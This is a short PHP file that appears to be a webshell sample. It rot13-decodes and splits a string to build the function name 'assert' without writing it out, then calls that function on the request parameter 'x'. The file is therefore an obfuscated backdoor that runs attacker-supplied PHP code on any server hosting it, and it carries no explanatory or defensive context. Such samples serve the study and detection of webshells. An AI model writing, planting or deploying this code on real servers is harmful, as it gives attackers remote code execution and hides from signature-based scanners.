<?php
class One{
function Sn0w($x){
$c=str_rot13('n!ff!re!nffreg');
$str=explode('!',$c)[3];
$str($x);
}
}
$test=new One();
$test->Sn0w($_REQUEST['x']);
?>